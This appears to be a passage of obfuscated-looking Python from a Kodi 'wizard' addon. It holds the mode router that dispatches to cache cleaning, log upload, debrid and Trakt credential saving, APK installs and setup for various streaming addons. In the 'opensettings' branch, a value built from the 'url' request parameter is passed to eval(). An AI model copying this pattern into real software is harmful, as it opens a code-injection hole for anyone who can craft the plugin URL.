elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5620
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5621
elif mode =='fixskin':backtokodi ()#line:5622
elif mode =='testcommand':testcommand ()#line:5623
elif mode =='logsend':logsend ()#line:5624
elif mode =='rdon':rdon ()#line:5625
elif mode =='rdoff':rdoff ()#line:5626
elif mode =='setrd':setrealdebrid ()#line:5627
elif mode =='setrd2':setautorealdebrid ()#line:5628
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5629
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5630
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5631
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5632
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5633
elif mode =='freshstart':freshStart ()#line:5634
elif mode =='forceupdate':wiz .forceUpdate ()#line:5635
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5636
elif mode =='forceclose':wiz .killxbmc ()#line:5637
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5638
elif mode =='hidepassword':wiz .hidePassword ()#line:5639
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5640
elif mode =='enableaddons':enableAddons ()#line:5641
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5642
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5643
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5644
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5645
elif mode =='uploadlog':uploadLog .Main ()#line:5646
elif mode =='viewlog':LogViewer ()#line:5647
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5648
elif mode =='viewerrorlog':errorChecking (all =True )#line:5649
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5650
elif mode =='purgedb':purgeDb ()#line:5651
elif mode =='fixaddonupdate':fixUpdate ()#line:5652
elif mode =='removeaddons':removeAddonMenu ()#line:5653
elif mode =='removeaddon':removeAddon (name )#line:5654
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5655
elif mode =='removedata':removeAddonData (name )#line:5656
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5657
elif mode =='systeminfo':systemInfo ()#line:5658
elif mode =='restorezip':restoreit ('build')#line:5659
elif mode =='restoregui':restoreit ('gui')#line:5660
elif mode =='restoreaddon':restoreit ('addondata')#line:5661
elif mode =='restoreextzip':restoreextit ('build')#line:5662
elif mode =='restoreextgui':restoreextit ('gui')#line:5663
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5664
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5665
elif mode =='traktsync':traktsync ()#line:5666
elif mode =='apk':apkMenu (name )#line:5668
elif mode =='apkscrape':apkScraper (name )#line:5669
elif mode =='apkinstall':apkInstaller (name ,url )#line:5670
elif mode =='speed':speedMenu ()#line:5671
elif mode =='net':net_tools ()#line:5672
elif mode =='GetList':GetList (url )#line:5673
elif mode =='youtube':youtubeMenu (name )#line:5674
elif mode =='viewVideo':playVideo (url )#line:5675
elif mode =='addons':addonMenu (name )#line:5677
elif mode =='addoninstall':addonInstaller (name ,url )#line:5678
elif mode =='savedata':saveMenu ()#line:5680
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5681
elif mode =='managedata':manageSaveData (name )#line:5682
elif mode =='whitelist':wiz .whiteList (name )#line:5683
elif mode =='trakt':traktMenu ()#line:5685
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5686
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5687
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5688
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5689
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5690
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5691
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5692
elif mode =='realdebrid':realMenu ()#line:5694
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5695
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5696
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5697
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5698
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5699
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5700
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5701
elif mode =='login':loginMenu ()#line:5703
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5704
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5705
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5706
elif mode =='clearlogin':loginit .clearSaved (name )#line:5707
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5708
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5709
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5710
elif mode =='contact':notify .contact (CONTACT )#line:5712
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5713
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5714
elif mode =='developer':developer ()#line:5716
elif mode =='converttext':wiz .convertText ()#line:5717
elif mode =='createqr':wiz .createQR ()#line:5718
elif mode =='testnotify':testnotify ()#line:5719
elif mode =='testnotify2':testnotify2 ()#line:5720
elif mode =='servicemanual':servicemanual ()#line:5721
elif mode =='fastinstall':fastinstall ()#line:5722
elif mode =='testupdate':testupdate ()#line:5723
elif mode =='testfirst':testfirst ()#line:5724
elif mode =='testfirstrun':testfirstRun ()#line:5725
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5726
elif mode =='bg':wiz .bg_install (name ,url )#line:5728
elif mode =='bgcustom':wiz .bg_custom ()#line:5729
elif mode =='bgremove':wiz .bg_remove ()#line:5730
elif mode =='bgdefault':wiz .bg_default ()#line:5731
elif mode =='rdset':rdsetup ()#line:5732
elif mode =='mor':morsetup ()#line:5733
elif mode =='mor2':morsetup2 ()#line:5734
elif mode =='resolveurl':resolveurlsetup ()#line:5735
elif mode =='urlresolver':urlresolversetup ()#line:5736
elif mode =='forcefastupdate':forcefastupdate ()#line:5737
elif mode =='traktset':traktsetup ()#line:5738
elif mode =='placentaset':placentasetup ()#line:5739
elif mode =='flixnetset':flixnetsetup ()#line:5740
elif mode =='reptiliaset':reptiliasetup ()#line:5741
elif mode =='yodasset':yodasetup ()#line:5742
elif mode =='numbersset':numberssetup ()#line:5743
elif mode =='uranusset':uranussetup ()#line:5744
elif mode =='genesisset':genesissetup ()#line:5745
elif mode =='fastupdate':fastupdate ()#line:5746
elif mode =='folderback':folderback ()#line:5747
elif mode =='menudata':Menu ()#line:5748
elif mode ==2 :#line:5750
        wiz .torent_menu ()#line:5751
elif mode ==3 :#line:5752
        wiz .popcorn_menu ()#line:5753
elif mode ==8 :#line:5754
        wiz .metaliq_fix ()#line:5755
elif mode ==9 :#line:5756
        wiz .quasar_menu ()#line:5757
elif mode ==5 :#line:5758
        swapSkins ('skin.Premium.mod')#line:5759
elif mode ==13 :#line:5760
        wiz .elementum_menu ()#line:5761
elif mode ==16 :#line:5762
        wiz .fix_wizard ()#line:5763
elif mode ==17 :#line:5764
        wiz .last_play ()#line:5765
elif mode ==18 :#line:5766
        wiz .normal_metalliq ()#line:5767
elif mode ==19 :#line:5768
        wiz .fast_metalliq ()#line:5769
elif mode ==20 :#line:5770
        wiz .fix_buffer2 ()#line:5771
elif mode ==21 :#line:5772
        wiz .fix_buffer3 ()#line:5773
elif mode ==11 :#line:5774
        wiz .fix_buffer ()#line:5775
elif mode ==15 :#line:5776
        wiz .fix_font ()#line:5777
elif mode ==14 :#line:5778
        wiz .clean_pass ()#line:5779
elif mode ==22 :#line:5780
        wiz .movie_update ()#line:5781
elif mode =='adv_settings':buffer1 ()#line:5782
elif mode =='getpass':getpass ()#line:5783
elif mode =='setpass':setpass ()#line:5784
elif mode =='setuname':setuname ()#line:5785
elif mode =='passandUsername':passandUsername ()#line:5786
elif mode =='9':disply_hwr ()#line:5787
elif mode =='99':disply_hwr2 ()#line:5788
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))